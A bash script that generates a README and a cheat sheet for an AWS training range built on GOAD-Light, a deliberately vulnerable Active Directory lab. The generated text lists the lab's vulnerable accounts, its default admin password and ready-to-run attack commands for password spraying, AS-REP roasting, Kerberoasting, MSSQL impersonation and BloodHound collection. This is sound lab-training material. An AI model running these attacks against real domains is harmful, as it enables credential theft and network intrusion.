#!/bin/bash
# generate-docs.sh - Generate documentation for a specific range

set -e # Exit on any error

# Check arguments
if [ $# -lt 2 ]; then
    echo "Usage: $0 <range-id> <base-dir>"
    exit 1
fi

RANGE_ID=$1
BASE_DIR=$2
RANGE_DIR="${BASE_DIR}/${RANGE_ID}"
DOCS_DIR="${RANGE_DIR}/docs"

# Check if necessary files exist
if [ ! -f "${RANGE_DIR}/range-config.json" ]; then
    echo "Configuration file not found: ${RANGE_DIR}/range-config.json"
    exit 1
fi

# Create docs directory if it doesn't exist
mkdir -p "$DOCS_DIR"

# Generate documentation
echo "Generating documentation for range: $RANGE_ID"

# Load configuration
CONFIG_FILE="${RANGE_DIR}/range-config.json"
RANGE_NUM=$(jq -r '.range_number' "$CONFIG_FILE")
AWS_REGION=$(jq -r '.aws_region' "$CONFIG_FILE")
GOAD_CIDR=$(jq -r '.goad_cidr' "$CONFIG_FILE")
UBUNTU_SUBNET=$(jq -r '.ubuntu_subnet' "$CONFIG_FILE")
ENABLE_DESKTOP=$(jq -r '.enable_desktop' "$CONFIG_FILE")
INSTALL_RDP=$(jq -r '.install_rdp' "$CONFIG_FILE")

# Gather GOAD information
GOAD_SUMMARY="${RANGE_DIR}/goad-summary.txt"
GOAD_INSTANCES="${RANGE_DIR}/goad-instances.json"

# Gather Ubuntu information
UBUNTU_SUMMARY="${RANGE_DIR}/ubuntu-summary.txt"
UBUNTU_OUTPUT="${RANGE_DIR}/ubuntu-output.json"

# Create README
cat > "${DOCS_DIR}/README.md" <<EOF
# Range ${RANGE_ID} Documentation

## Overview

This document provides instructions for accessing and using Range ${RANGE_ID}, which consists of:
- GOAD-Light: A vulnerable Active Directory environment
- 3 Ubuntu servers: Pre-configured to interact with GOAD-Light

## Environment Details

- **Range ID**: ${RANGE_ID}
- **Range Number**: ${RANGE_NUM}
- **AWS Region**: ${AWS_REGION}
- **GOAD Network**: ${GOAD_CIDR}
- **Ubuntu Network**: ${UBUNTU_SUBNET}
- **Desktop Environment**: $([ "$ENABLE_DESKTOP" == "true" ] && echo "Enabled" || echo "Disabled")
- **RDP Access**: $([ "$INSTALL_RDP" == "true" ] && echo "Enabled" || echo "Disabled")
- **Deployment Date**: $(date)

## GOAD-Light Environment

### Domain Information

- **Parent Domain**: sevenkingdoms.local
- **Child Domain**: north.sevenkingdoms.local
- **Domain Admin**: Administrator
- **Password**: Password123!

### Servers

- **DC1 (kingslanding)**: 192.168.${RANGE_NUM}.10
  - Primary Domain Controller for sevenkingdoms.local
  - Windows Server 2019

- **DC2 (winterfell)**: 192.168.${RANGE_NUM}.11
  - Domain Controller for north.sevenkingdoms.local
  - Windows Server 2019

- **SRV (castelblack)**: 192.168.${RANGE_NUM}.22
  - Member server in north.sevenkingdoms.local
  - Windows Server 2019
  - Hosts services (IIS, MSSQL, etc.)

### Public IP Addresses

EOF

# Add GOAD public IPs if available
if [ -f "$GOAD_INSTANCES" ]; then
    jq -r '.[][] | select(.[3][0] != null) | "- **\(.[3][0])**: \(.[2])"' "$GOAD_INSTANCES" >> "${DOCS_DIR}/README.md"
else
    echo "GOAD instances information not available." >> "${DOCS_DIR}/README.md"
fi

# Continue with Ubuntu information
cat >> "${DOCS_DIR}/README.md" <<EOF

## Ubuntu Servers

Three Ubuntu 24.04 servers have been deployed, pre-configured to interact with the GOAD-Light environment.

### Server Information

EOF

# Add Ubuntu information if available
if [ -f "$UBUNTU_OUTPUT" ]; then
    jq -r '.private_ips.value | to_entries | map("- **Ubuntu " + (.key + 1 | tostring) + "**: " + .value) | .[]' "$UBUNTU_OUTPUT" >> "${DOCS_DIR}/README.md"
    
    # Add SSH access information
    cat >> "${DOCS_DIR}/README.md" <<EOF

### SSH Access

EOF
    jq -r '.ssh_commands.value | to_entries | map("- **Ubuntu " + (.key + 1 | tostring) + "**: `" + .value + "`") | .[]' "$UBUNTU_OUTPUT" >> "${DOCS_DIR}/README.md"
    
    # Add RDP access information if enabled
    if [ "$INSTALL_RDP" == "true" ]; then
        cat >> "${DOCS_DIR}/README.md" <<EOF

### RDP Access

EOF
        jq -r '.rdp_commands.value | to_entries | map("- **Ubuntu " + (.key + 1 | tostring) + "**: " + .value) | .[]' "$UBUNTU_OUTPUT" >> "${DOCS_DIR}/README.md"
    fi
else
    echo "Ubuntu deployment information not available." >> "${DOCS_DIR}/README.md"
fi

# Add usage instructions
cat >> "${DOCS_DIR}/README.md" <<EOF

## Usage Instructions

### Connecting to GOAD-Light

1. **Via RDP**:
   - Use an RDP client to connect to the public IP addresses of the GOAD servers
   - Username: Administrator
   - Password: Password123!

2. **From Ubuntu Servers**:
   - SSH into any of the Ubuntu servers
   - Use the pre-configured commands to connect to GOAD:
     - \`rdp-kingslanding\`: Connect to the main domain controller
     - \`rdp-winterfell\`: Connect to the child domain controller
     - \`rdp-castelblack\`: Connect to the member server

### Testing Connectivity

Once logged into an Ubuntu server, run:
\`\`\`bash
./check-goad-connectivity.sh
\`\`\`

This will verify connectivity to all GOAD-Light servers and services.

### Available Tools

The Ubuntu servers come pre-installed with:
- impacket (For AD exploitation)
- crackmapexec (For enumeration and attack)
- bloodhound (For AD visualization)
- ldapsearch, smbclient (For directory services)
- Various network utilities

### Useful Commands

\`\`\`bash
# Check GOAD connectivity
check-goad

# Enumerate users in the main domain
enum-sevenkingdoms

# Enumerate users in the child domain
enum-north

# Get a Kerberos ticket
get-ticket Administrator 'Password123!' sevenkingdoms.local
\`\`\`

## Vulnerabilities to Explore

GOAD-Light contains numerous vulnerabilities, including:

1. **Credential-based attacks**
   - Password spraying (hodor:hodor)
   - Passwords in LDAP description fields (samwell.tarly)

2. **Kerberos attacks**
   - AS-REP Roasting (brandon.stark)
   - Kerberoasting (jon.snow)

3. **ACL-based attacks**
   - WriteDACL/WriteOwner on groups (jeor.mormont on "Night Watch")
   - GenericAll on computers (stannis.baratheon on "kingslanding")
   - ForceChangePassword on users (tywin.lannister on jaime.lannister)

4. **MSSQL attacks**
   - Execute as user (arya.stark)
   - Execute as login (samwell.tarly to sa)

5. **Cross-domain attacks**
   - Group membership across domains (jon.snow)

## Troubleshooting

If you encounter connectivity issues:

1. Verify that all servers are running
2. Check network connectivity with ping
3. Ensure security groups allow necessary traffic
4. Verify VPC peering connection is active (if applicable)

## Support

For issues or questions, please contact the lab administrator.
EOF

# Create HTML version of the documentation
if command -v pandoc &> /dev/null; then
    echo "Converting documentation to HTML..."
    pandoc "${DOCS_DIR}/README.md" -o "${DOCS_DIR}/index.html" --metadata title="${RANGE_ID} Documentation" -s --toc
else
    # Simple HTML conversion if pandoc is not available
    echo "Pandoc not found, creating simple HTML..."
    (
        echo "<!DOCTYPE html><html><head><title>${RANGE_ID} Documentation</title>"
        echo "<style>body{font-family:Arial,sans-serif;line-height:1.6;max-width:900px;margin:0 auto;padding:20px}h1,h2,h3{color:#2c3e50}code{background:#f8f8f8;padding:2px 4px;border-radius:3px}pre{background:#f8f8f8;padding:10px;border-radius:5px;overflow-x:auto}</style>"
        echo "</head><body>"
        echo "<h1>Range ${RANGE_ID} Documentation</h1>"
        cat "${DOCS_DIR}/README.md" | sed 's/^# /\<h1\>/g' | sed 's/^## /\<h2\>/g' | sed 's/^### /\<h3\>/g' | \
            sed 's/^- /\<li\>/g' | sed 's/$/\<\/li\>/g' | sed 's/^```bash/\<pre\>\<code\>/g' | sed 's/^```/\<\/code\>\<\/pre\>/g' | \
            sed 's/*\([^*]*\)*/\<strong\>\1\<\/strong\>/g'
        echo "</body></html>"
    ) > "${DOCS_DIR}/index.html"
fi

# Create a cheat sheet
cat > "${DOCS_DIR}/cheatsheet.md" <<EOF
# Range ${RANGE_ID} Cheat Sheet

## Quick Reference

### GOAD-Light Servers
- DC1 (kingslanding): 192.168.${RANGE_NUM}.10
- DC2 (winterfell): 192.168.${RANGE_NUM}.11
- SRV (castelblack): 192.168.${RANGE_NUM}.22

### Domains
- Parent: sevenkingdoms.local
- Child: north.sevenkingdoms.local

### Default Credentials
- Username: Administrator
- Password: Password123!

### Ubuntu Servers
EOF

# Add Ubuntu information if available
if [ -f "$UBUNTU_OUTPUT" ]; then
    jq -r '.private_ips.value | to_entries | map("- Ubuntu " + (.key + 1 | tostring) + ": " + .value) | .[]' "$UBUNTU_OUTPUT" >> "${DOCS_DIR}/cheatsheet.md"
fi

cat >> "${DOCS_DIR}/cheatsheet.md" <<EOF

## Common Commands

### Connectivity Testing
\`\`\`bash
# Test connectivity to GOAD
./check-goad-connectivity.sh

# Quick connectivity check
check-goad
\`\`\`

### RDP Access
\`\`\`bash
# RDP to kingslanding
rdp-kingslanding

# RDP to winterfell
rdp-winterfell

# RDP to castelblack
rdp-castelblack
\`\`\`

### Enumeration
\`\`\`bash
# Enumerate users in sevenkingdoms.local
enum-sevenkingdoms

# Enumerate users in north.sevenkingdoms.local
enum-north

# SMB enumeration
crackmapexec smb 192.168.${RANGE_NUM}.0/24

# LDAP enumeration
ldapsearch -x -h kingslanding.sevenkingdoms.local -b "DC=sevenkingdoms,DC=local"
\`\`\`

### Authentication
\`\`\`bash
# Get Kerberos ticket
get-ticket Administrator 'Password123!' sevenkingdoms.local

# Password spray
crackmapexec smb winterfell.north.sevenkingdoms.local -u hodor -p hodor

# AS-REP Roasting
impacket-GetNPUsers north.sevenkingdoms.local/brandon.stark -no-pass -dc-ip 192.168.${RANGE_NUM}.11

# Kerberoasting
impacket-GetUserSPNs north.sevenkingdoms.local/jon.snow:Password123! -dc-ip 192.168.${RANGE_NUM}.11
\`\`\`

### MSSQL Attacks
\`\`\`bash
# Connect to MSSQL
impacket-mssqlclient north.sevenkingdoms.local/jon.snow:Password123!@192.168.${RANGE_NUM}.22

# Execute as user
EXECUTE AS USER = 'arya.stark'
SELECT SYSTEM_USER, USER_NAME();

# Execute as login
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER, USER_NAME();
\`\`\`

### BloodHound
\`\`\`bash
# Collect data
bloodhound-python -d sevenkingdoms.local -u 'Administrator' -p 'Password123!' -c All -ns 192.168.${RANGE_NUM}.10

# Start neo4j database
sudo neo4j start

# Launch BloodHound
bloodhound
\`\`\`
EOF

echo "Documentation generated for range: $RANGE_ID"
echo "- README: ${DOCS_DIR}/README.md"
echo "- HTML: ${DOCS_DIR}/index.html"

echo "- Cheat Sheet: ${DOCS_DIR}/cheatsheet.md"